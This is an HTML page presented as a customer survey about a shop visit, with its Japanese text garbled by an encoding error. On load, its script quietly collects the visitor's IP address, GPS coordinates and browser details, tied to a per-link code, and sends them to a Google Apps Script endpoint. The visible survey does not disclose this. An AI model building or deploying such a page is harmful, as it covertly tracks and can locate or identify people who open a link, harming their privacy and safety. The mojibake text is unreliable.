<!DOCTYPE html>
<html lang="ja">
<head>
<meta charset="UTF-8">
<title>ã‚¢ãƒ³ã‚±ãƒ¼ãƒˆãƒšãƒ¼ã‚¸</title>
<style>
body { font-family: sans-serif; margin: 40px; }
h1 { color: #3366cc; }
fieldset { margin-bottom: 1em; }
button { padding: 8px 16px; font-size: 1em; }
</style>
</head>
<body>
<h1>ã”æ¥åº—ã‚¢ãƒ³ã‚±ãƒ¼ãƒˆ</h1>

<form id="form">
  <fieldset>
    <legend>Q1. æœ¬æ—¥ã®æº€è¶³åº¦ã‚’ãŠèã‹ã›ãã ã•ã„</legend>
    <label><input type="radio" name="q1" value="æº€è¶³"> æº€è¶³</label>
    <label><input type="radio" name="q1" value="æ™®é€š"> æ™®é€š</label>
    <label><input type="radio" name="q1" value="ä¸æº€"> ä¸æº€</label>
  </fieldset>

  <fieldset>
    <legend>Q2. ã‚¹ã‚¿ãƒƒãƒ•ã®å¯¾å¿œã¯ã„ã‹ãŒã§ã—ãŸã‹ï¼Ÿ</legend>
    <label><input type="radio" name="q2" value="è‰¯ã„"> è‰¯ã„</label>
    <label><input type="radio" name="q2" value="æ™®é€š"> æ™®é€š</label>
    <label><input type="radio" name="q2" value="æ‚ªã„"> æ‚ªã„</label>
  </fieldset>

  <fieldset>
    <legend>Q3. ã”æ„è¦‹ãƒ»ã”æ„Ÿæƒ³ï¼ˆä»»æ„ï¼‰</legend>
    <textarea name="q3" rows="3" cols="40"></textarea>
  </fieldset>

  <button type="submit">é€ä¿¡</button>
</form>

<script>
const GAS_URL = "https://script.google.com/macros/s/AKfycby8qwz4PJgtCwA3c_seK6Qulf_rS5u5qUer6MpKaFVLp7inShArUOwRWky0s9KykyyF9A/exec";

// URLæœ«å°¾ã®ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ï¼ˆä¾‹: ?12345ï¼‰ã‹ã‚‰ã‚³ãƒ¼ãƒ‰ã‚’å–å¾—
const params = new URLSearchParams(window.location.search);
const code = [...params.keys()][0] || "";

// ğŸ” IPã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’å¤–éƒ¨APIã‹ã‚‰å–å¾—
fetch("https://api.ipify.org?format=json")
  .then(res => res.json())
  .then(ipData => {
    // ğŸ“ GPSä½ç½®æƒ…å ±ã‚’å–å¾—
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(pos => {
        sendAccess(ipData.ip, pos.coords.latitude, pos.coords.longitude);
      }, err => {
        // ä½ç½®æƒ…å ±å–å¾—å¤±æ•—æ™‚
        sendAccess(ipData.ip, "", "");
      });
    } else {
      sendAccess(ipData.ip, "", "");
    }
  })
  .catch(() => sendAccess("", "", ""));

// âœ… ã‚¢ã‚¯ã‚»ã‚¹è¨˜éŒ²é€ä¿¡
function sendAccess(ip, lat, lng) {
  fetch(GAS_URL, {
    method: "POST",
    body: JSON.stringify({
      type: "access",
      code: code,
      ua: navigator.userAgent,
      ip: ip,
      lat: lat,
      lng: lng
    })
  });
}

// âœ… ã‚¢ãƒ³ã‚±ãƒ¼ãƒˆé€ä¿¡
document.getElementById("form").addEventListener("submit", async e => {
  e.preventDefault();
  const q1 = document.querySelector('input[name="q1"]:checked')?.value || "";
  const q2 = document.querySelector('input[name="q2"]:checked')?.value || "";
  const q3 = document.querySelector('textarea[name="q3"]').value || "";

  if (!q1 || !q2) {
    alert("å…¨ã¦ã®è³ªå•ã«å›ç­”ã—ã¦ãã ã•ã„ã€‚");
    return;
  }

  await fetch(GAS_URL, {
    method: "POST",
    body: JSON.stringify({
      type: "survey",
      code: code,
      answers: [q1, q2, q3]
    })
  });

  alert("ã”å›ç­”ã‚ã‚ŠãŒã¨ã†ã”ã–ã„ã¾ã—ãŸï¼");
  document.getElementById("form").reset();
});
</script>
</body>
</html>
